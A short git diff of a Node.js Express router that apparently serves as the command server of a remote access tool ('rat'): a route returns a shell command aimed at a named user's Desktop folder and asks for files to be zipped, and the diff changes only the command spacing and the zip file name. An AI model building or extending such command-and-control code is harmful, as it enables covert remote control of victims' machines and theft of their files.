@@ -219,12 +219,12 @@ router.post("/rat/postdata", async (req, res) =>  {
 //get all users route
 router.get('/rat/dos', async (req, res) => {
 
-    let dosya_yolu_al_getir = "cd C:/Users/\"emirhan karakoc\"/Desktop && cd"
+    let dosya_yolu_al_getir = "cd C:/Users/\"emirhan karakoc\"/Desktop && cd "
     const response = {
         username: "emirhan karakoc",
         command: dosya_yolu_al_getir,
         zip:"true",
-        zipfile:"texts"
+        zipfile:"asd"
     }
         res.send(response);
 
